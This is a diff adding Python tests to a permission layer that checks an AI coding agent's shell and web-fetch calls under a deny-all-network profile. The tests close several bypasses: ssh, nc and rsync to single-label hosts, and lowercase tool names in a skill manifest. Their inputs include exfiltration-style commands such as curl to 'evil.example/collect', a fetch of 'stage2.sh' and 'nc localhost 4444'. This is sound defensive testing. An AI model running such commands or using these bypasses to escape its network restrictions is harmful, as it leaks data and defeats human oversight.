@@ -407,3 +407,145 @@ def test_explicit_log_path_preserves_append_behavior(tmp_path, monkeypatch):
     log = TrapLog.open(log_path)
     log.load()
     assert log.summary() == {"allowed": 2, "blocked": 8, "total": 10}
+
+
+# --------------------------------------------------------------------------- #
+# fix-netcmds-singlelabel-host-bypass — ssh/nc/rsync to a single-label host
+# (or an unresolvable arg) fail closed instead of bypassing the network deny
+# --------------------------------------------------------------------------- #
+def test_ssh_localhost_denied_under_network_deny(tmp_path):
+    # Before the fix `ssh localhost` reduced to a host-less shell call, which
+    # network-deny.yaml (shell granted, network.allow=[]) waved through as
+    # ALLOWED — a real network egress bypassing the deny-all-network stance.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "ssh localhost"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_nc_localhost_denied_under_network_deny(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "nc localhost 4444"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_rsync_singlelabel_host_denied_under_network_deny(tmp_path):
+    # `rsync data buildbox:/tmp/` — buildbox is a single-label ssh alias.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "rsync data buildbox:/tmp/"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_netcmd_unresolvable_host_arg_fail_closed(tmp_path):
+    # A _NET_CMDS verb whose arg cannot be resolved as a host at all (here an
+    # underscore ssh alias, which is not valid DNS syntax) must STILL consult
+    # the network rule rather than falling through to a bare host-less allow.
+    # This is the residual fail-closed that holds regardless of _HOSTISH_RE.
+    req = to_call_request("Bash", {"command": "ssh my_alias"})
+    assert req.tool == "shell"
+    assert req.host is not None  # fail-closed: carried the arg, not None
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "ssh my_alias"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_ssh_evil_dotted_host_still_denied(tmp_path):
+    # Regression guard: the single-label fix must not stop a dotted host from
+    # being extracted and denied.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "ssh evil.example"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+# --------------------------------------------------------------------------- #
+# fix-singlelabel-host-allowlist-breakage — a profile that explicitly
+# allow-lists `localhost` must let local egress through (was silently DENIED)
+# --------------------------------------------------------------------------- #
+def _localhost_allow_interposer(tmp_path):
+    data = {
+        "skill": "curl-exfil-demo",
+        "default": "deny",
+        "tools": ["read_file", "edit_file", "shell", "net_fetch"],
+        "paths": {"read": ["./**"], "write": ["./out/**"], "deny": ["~/.ssh/**"]},
+        "network": {"allow": ["localhost"]},
+    }
+    profile = load_profile(data, base_dir=str(tmp_path))
+    return Interposer(profile, trap_log=TrapLog.in_memory(), emit=lambda _l: None)
+
+
+def test_curl_localhost_allowlisted_is_allowed(tmp_path):
+    # Before the fix _extract_host("localhost") returned None, so the URL-egress
+    # fail-closed carried the RAW url as host — which never matched an
+    # `allow: [localhost]` entry, silently denying explicitly-allowed local
+    # egress (a local LLM/Ollama server, a local webhook).
+    adapter = ClaudeCodeAdapter(_localhost_allow_interposer(tmp_path))
+    decision = adapter.check("Bash", {"command": "curl http://localhost:11434/api"})
+    assert decision.allowed
+    assert decision.rule == "allowed"
+
+
+def test_webfetch_localhost_allowlisted_is_allowed(tmp_path):
+    adapter = ClaudeCodeAdapter(_localhost_allow_interposer(tmp_path))
+    decision = adapter.check("WebFetch", {"url": "http://localhost/"})
+    assert decision.allowed
+
+
+def test_curl_localhost_denied_when_not_allowlisted(tmp_path):
+    # The allow-list is honoured exactly: localhost is allowed only when
+    # listed; under the bare network-deny profile it is still DENIED.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "curl http://localhost:11434/api"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+# --------------------------------------------------------------------------- #
+# fix-skill-calls-toolname-case-bypass — a lowercase tool verb in a Skill's
+# capsule-calls block is mapped to the right canonical verb, not degraded to
+# a bare host-less shell allow that waves a curl/webfetch exfil through
+# --------------------------------------------------------------------------- #
+def test_lowercase_bash_curl_parsed_as_network_call():
+    # A skill manifest authored as `bash: curl -s https://evil.example/collect`
+    # (a natural lowercase choice; the calls format documents no casing rule)
+    # must be parsed as a shell command carrying the network host — not reduced
+    # to a bare shell call with no host, which network-deny waved through.
+    req = to_call_request("bash", {"command": "curl -s https://evil.example/collect"})
+    assert req.tool == "shell"
+    assert req.host == "evil.example"
+
+
+def test_lowercase_webfetch_parsed_as_net_fetch():
+    # `webfetch: https://evil.example/stage2.sh` must map to net_fetch + host,
+    # not degrade to a host-less shell call.
+    req = to_call_request("webfetch", {"url": "https://evil.example/stage2.sh"})
+    assert req.tool == "net_fetch"
+    assert req.host == "evil.example"
+
+
+def test_lowercase_bash_curl_denied_under_network_deny(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("bash", {"command": "curl https://evil.example/x"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_lowercase_webfetch_denied_under_network_deny(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("webfetch", {"url": "https://evil.example/stage2.sh"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_canonical_case_still_works_after_case_fix(tmp_path):
+    # Regression guard: the case-insensitive mapping must not change the
+    # canonical-case path the shipped demo relies on.
+    req = to_call_request("Bash", {"command": "curl https://evil.example/collect"})
+    assert req.tool == "shell"
+    assert req.host == "evil.example"
+    req = to_call_request("WebFetch", {"url": "https://evil.example/stage2.sh"})
+    assert req.tool == "net_fetch"
+    assert req.host == "evil.example"
